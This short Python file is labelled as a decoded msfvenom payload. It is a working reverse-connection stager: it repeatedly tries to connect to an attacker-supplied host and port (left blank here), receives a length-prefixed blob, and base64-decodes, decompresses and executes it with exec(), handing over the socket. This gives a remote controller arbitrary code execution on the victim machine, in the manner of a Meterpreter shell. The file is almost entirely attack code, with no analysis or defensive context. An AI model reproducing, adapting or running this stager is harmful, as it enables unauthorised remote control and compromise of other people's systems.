# msfvenom python payload base64 decoded

import socket,zlib,base64,struct,time

HOST = 
PORT =

for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})